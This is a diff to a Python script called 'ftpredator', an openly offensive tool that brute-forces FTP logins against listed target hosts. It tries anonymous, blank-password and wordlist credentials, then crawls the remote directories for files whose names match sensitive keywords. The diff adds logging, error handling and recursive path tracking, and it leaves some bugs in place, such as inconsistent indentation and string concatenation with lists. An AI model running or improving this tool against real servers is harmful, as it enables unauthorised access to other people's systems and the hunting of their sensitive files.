@@ -32,25 +32,25 @@ from ftplib import *
 # Setup FTP protocol message/response list here
 ftp_resp_list = ["230"] # TODO: add the rest - they'll probably be needed at some point
 
-def check_remote_ftp_contents(ftp, strings):
+def check_remote_ftp_contents(ftp, strings, dirstr = "/"):
 	''' 
 	Return a list of absolute paths to files on the ftp connection that contain sensitive words.
 	'''
-	current_dir_contents = ftp.nlist()
+	current_dir_contents = ftp.nlst()
 	sensitive_files = []
 	for entry in current_dir_contents:
 		try:
 			# try to set the new current working directory to each item in the list to determine if its a new dir
 			ftp.cwd(entry)
-			sensitive_files.append(check_remote_ftp_contents(ftp, strings))
+			sensitive_files.append(check_remote_ftp_contents(ftp, strings, dirstr + str(entry) + "/"))
 		except:
 			# This entry must be a file, so create a list of matching words
 			matches = []
 			for ss in strings:
-				if ss in file_name:
+				if ss in entry:
 					matches.append(ss)
 			if (len(matches) > 0):
-				sensitive_files.append((entry, matches))
+				sensitive_files.append((dirstr + entry, matches))
 	return sensitive_files
 
 def find_valid_logins(host, username, passwords, TLS = False):
@@ -60,24 +60,38 @@ def find_valid_logins(host, username, passwords, TLS = False):
 
 	creds = []
 
+	print >> sys.stderr, "FINDING LOGINS FOR THE FOLLOWING CREDENTIALS"
+	print >> sys.stderr, "Usernames: " + str(username)
+        print >> sys.stderr, "Passwords: " + str(passwords)
+	
 	if len(host) == 0:
 		raise Exception("You must provide a valid host name")
 
 	# Try anonymous first
-	anon = is_valid_login(host, "", "", TLS)
+	anon = False
+	try:
+		anon = is_valid_login(host, "", "", TLS)
+	except:
+		print >> sys.stderr, "Anonymous login failed."
 
 	# Empty passwords
 	for u in username:
-		if is_valid_login(host, u, "", TLS):
-			creds.append((u, ""))
+		try:
+			if is_valid_login(host, u, "", TLS):
+				creds.append((u, ""))
+		except:
+			print >> sys.stderr, "Blank password for username " + str(u) + " failed"
 
 	# Non-empty usernames and passwords
 	for u in username:
 		for p in passwords:
-			if is_valid_login(host, u, p, TLS):
-				creds.append((u, p))
+			try:
+				if is_valid_login(host, u, p, TLS):
+					creds.append((u, p))
+			except:
+				print >> sys.stderr, "Username/password " + username + " " + password + " failed"
 
-	return creds
+	return anon, creds
 
 def is_valid_login(host, username, password, TLS = False):
 	''' Check the validity of a specific username/password combination.
@@ -85,6 +99,9 @@ def is_valid_login(host, username, password, TLS = False):
 	'''
 
 	success = False
+
+	print >> sys.stderr, "Trying:\n\t" + username + "\n\t" + password
+	print >> sys.stderr, "TLS enabled: " + str(TLS)
 
 	if len(host) == 0:
 		raise Exception("You must provide a valid host name")
@@ -99,20 +116,20 @@ def is_valid_login(host, username, password, TLS = False):
 			try:
 				ftp.login()
 				success = True
-			except:
-				pass
+			except Exception as e:
+				print >> sys.stderr, e
 		elif len(password) == 0: # Blank password
 			try:
 				ftp.login(username)
 				success = True
-			except:
-				pass
+			except Exception as e:
+				print >> sys.stderr, e
 		else: # Non-empty username and password
 			try:
 				ftp.login(username, password)
 				success = True
-			except:
-				pass
+			except Exception as e:
+				print >> sys.stderr, e
 
 		# Clean up
 		ftp.quit() 
@@ -129,6 +146,13 @@ def find_matching_files_on_host(host, usernames, passwords, strings):
 	'''
 
 	paths = []
+
+	print >> sys.stderr, "Usernames:"
+	print >> sys.stderr, usernames
+	print >> sys.stderr, "Passwords:"
+	print >> sys.stderr, passwords
+	print >> sys.stderr, "Strings:"
+	print >> sys.stderr, strings
 
 	# Determine which login combinations work and which don't
 	anon_tls = False
@@ -148,33 +172,39 @@ def find_matching_files_on_host(host, usernames, passwords, strings):
 	# Note: if we get here, then the FTP service exists, so we don't need to do
 	# 	any error handling.
 	if anon_tls:
+		print >> sys.stderr, "Checking anonymous login with TLS"
 		ftp = FTP_TLS(host)
 		ftp.login()
 		paths.append(check_remote_ftp_contents(ftp, strings))
 		ftp.quit()
 	if anon_clr:
+		print >> sys.stderr, "Checking anonymous login in the clear"
 		ftp = FTP(host)
 		ftp.login()
 		paths.append(check_remote_ftp_contents(ftp, strings))
-		ftp.quit()
-	for creds in creds_tls:
-		ftp = FTP_TLS(host)
-		un = creds[0]
-		pw = ""
-		if len(creds[1]) > 0:
-			pw = creds[1]
-		ftp.login(un, pw)
-		paths.append(check_remote_ftp_contents(ftp, strings))
-		ftp.quit()
-	for creds in creds_tls:
-		ftp = FTP(host)
-		un = creds[0]
-		pw = ""
-		if len(creds[1]) > 0:
-			pw = creds[1]
-		ftp.login(un, pw)
-		paths.append(check_remote_ftp_contents(ftp, strings))
-		ftp.quit()
+                ftp.quit()
+	if len(creds_tls) > 0:
+		print >> sys.stderr, "Checking credential combinations in the clear"
+		for creds in creds_tls:
+			ftp = FTP_TLS(host)
+			un = creds[0]
+			pw = ""
+			if len(creds[1]) > 0:
+				pw = creds[1]
+			ftp.login(un, pw)
+			paths.append(check_remote_ftp_contents(ftp, strings))
+			ftp.quit()
+	if len(creds_clr) > 0:
+		print >> sys.stderr, "Checking credential combinations in the clear"
+		for creds in creds_clr:
+			ftp = FTP(host)
+			un = creds[0]
+			pw = ""
+			if len(creds[1]) > 0:
+				pw = creds[1]
+			ftp.login(un, pw)
+			paths.append(check_remote_ftp_contents(ftp, strings))
+			ftp.quit()
 
 	return paths
 
@@ -236,6 +266,7 @@ def main(host = "", host_file = "", username_file = "USERNAMES", password_file =
 			hdump.append(find_matching_files_on_host(f.readline().strip(), usernames, passwords, strings))
 
 	# TODO: do something with hdump!
+	print(hdump)
 
 def usage():
 	print >> sys.stderr, "usage: python ftpredator.py [-host <host> | -host_file <host_file> | -h] [ ... ]]"
@@ -243,7 +274,7 @@ def usage():
 # Entry point if run as the executable.
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(prog='ftpredator - preying on stupidly insecure FTP services')
-	parser.add_argument("-t", "--target", help="IP address of the target/host to attack", type=str, default="192.168.1.1")
+	parser.add_argument("-t", "--target", help="IP address of the target/host to attack", type=str, default="localhost")
 	parser.add_argument("-tf", "--target_file", help="File containing a list of targets/hosts on each line", type=str, default="")
 	parser.add_argument("-uf", "--username_file", help="File containing a list of usernames to try", type=str, default="USERNAMES")
 	parser.add_argument("-pf", "--password_file", help="File containing a list of passwords to try", type=str, default="PASSWORDS")
